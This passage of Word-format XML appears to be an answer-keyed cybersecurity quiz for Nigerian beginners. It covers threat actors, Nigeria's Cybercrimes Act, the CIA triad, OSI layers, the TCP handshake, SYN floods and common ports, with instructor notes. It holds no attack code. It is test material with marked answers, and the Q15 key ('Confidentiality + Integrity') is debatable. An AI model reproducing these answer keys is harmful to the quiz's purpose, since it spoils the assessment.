    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A hacker defaces a government website to protest a policy. Which threat actor category does this represent?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Nation-state</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Cybercriminal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Insider threat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Hacktivist</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Nigerian students often recall Anonymous defacing INEC after disputed elections.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q7</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which Nigerian law specifically criminalises hacking, phishing, and cybercrime?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Data Protection Act 2023</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Computer Use Policy 2010</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cybercrimes (Prohibition, Prevention, Etc.) Act 2015</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Electronic Transactions Act 2011</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Critical for Nigerian context — Section 6 imprisonment up to 3 years.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q8</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which of these is an example of a physical security control?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Firewall</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Encryption</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Antivirus</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Biometric door lock</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Distinguish physical, technical, and administrative controls — three control categories.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q9</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"Non-repudiation" in cybersecurity means:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) A user cannot be denied access to a system</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Data must not be altered in transit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A sender cannot later deny sending a message</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Systems must be available 99.9% of the time</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Important for digital signatures and legal evidence — link to email forensics later.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q10</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A disgruntled employee copies customer data to a USB drive before resigning. This is an example of:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Nation-state espionage</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Social engineering</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insider threat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Supply chain attack</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Insider threats account for 20–30% of data breaches — often underestimated by students.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q11</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which colour hat represents an ethical hacker who has explicit written authorisation?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Black hat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Grey hat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>White hat</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Red hat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Reinforce the authorisation distinction — this frames the entire course's ethical framework.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q12</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Authentication answers the question: "Are you who you claim to be?" Authorisation answers:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) "How did you get into the system?"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) "When did you last log in?"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) "What are you allowed to do?" ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) "Where are you connecting from?"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Authentication vs authorisation vs accounting (AAA) — common exam confusion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q13</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which career path focuses on finding vulnerabilities BEFORE attackers do?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Security Operations Centre (SOC) Analyst</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Digital Forensics Investigator</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Penetration Tester</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Compliance Officer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Good for career discussion moment — many students aspire to this role.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q14</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The CIA Triad creates tension because:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) You cannot have cybersecurity without all three</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Increasing security often reduces availability or convenience</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Confidentiality and integrity always conflict</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Availability is less important than the other two</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CRITICAL] · *Time:* 60 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* "Maximum security = zero usability" — the fundamental tension of security design.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q15</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A Nigerian fintech startup stores customer BVN data unencrypted and shares it with third-party partners without consent. Which two CIA pillars AND which law are violated?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Integrity + Availability; Cybercrimes Act 2015</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Confidentiality + Integrity; NDPA 2023</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Availability + Integrity; CBN Framework</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Confidentiality + Availability; Cybercrimes Act 2015</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Synthesises CIA Triad + Nigerian legal framework. Debrief: NDPA 2023 data minimisation principle, NDPC reporting obligations. Expect debate — use for class discussion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 2 [BEGINNER]: Networking &amp; Protocols</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Level: Beginner | Questions: Q16–Q30*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q16</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>How many layers does the OSI model have?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) 5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) 6</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Mnemonic: "Please Do Not Throw Sausage Pizza Away" — Physical, Data Link, Network, Transport, Session, Presentation, Application.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q17</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which OSI layer is responsible for routing packets between different networks?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Transport Layer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Data Link Layer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Network Layer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Session Layer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Layer 3 — where IP addresses live and routers operate.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q18</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is the purpose of the three-way TCP handshake?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) To encrypt data before transmission</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) To authenticate the server's identity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>To establish a reliable connection between client and server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) To compress data for faster transfer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* SYN → SYN-ACK → ACK. Foundation for understanding SYN flood attacks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q19</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A SYN flood attack exploits:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Weak passwords on routers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The TCP handshake by sending thousands of SYN packets without completing the connection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Unencrypted DNS queries</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Misconfigured firewall rules</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Classic DoS technique — server exhausts connection table waiting for final ACK that never comes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q20</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which port does HTTPS use by default?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) 80</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) 22</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) 8080</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>443</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* HTTP = 80, HTTPS = 443. Quick recall — do it fast.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q21</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Port 22 is associated with which protocol?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) FTP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Telnet</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SSH</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) DNS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* SSH (Secure Shell) replaced Telnet (port 23) — which sends credentials in plaintext.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q22</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which protocol resolves domain names like "metabridgeacademy.com" into IP addresses?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) DHCP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">B) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
